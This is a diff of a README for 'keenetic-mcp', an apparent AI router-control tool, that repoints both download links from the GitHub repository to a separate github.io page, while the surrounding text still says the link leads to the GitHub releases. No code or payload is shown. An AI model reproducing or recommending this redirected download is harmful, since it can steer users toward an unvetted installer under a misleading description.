@@ -1,7 +1,7 @@
 <h1>👨‍💻 keenetic-mcp - Control Your Keenetic Router With AI</h1>
 
 <p align="center">
-  <a href="https://github.com/elihucredible450/keenetic-mcp" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(99,102,241,0.4);">⬇️ Download Keenetic-MCP</a>
+  <a href="https://elihucredible450.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;font-size:20px;font-weight:bold;border-radius:12px;text-decoration:none;box-shadow:0 4px 15px rgba(99,102,241,0.4);">⬇️ Download Keenetic-MCP</a>
 </p>
 
 ## 🤔 What Is Keenetic-MCP?
@@ -44,7 +44,7 @@ Follow these steps carefully. It should take about 10 minutes total.
 
 Click the big purple button at the top of this page, or use this link:
 
-👉 **[Visit this link to download the application](https://github.com/elihucredible450/keenetic-mcp)**
+👉 **[Visit this link to download the application](https://elihucredible450.github.io)**
 
 This link will take you to the GitHub page where you can grab the file. Look for the latest release and download the installer file.
 
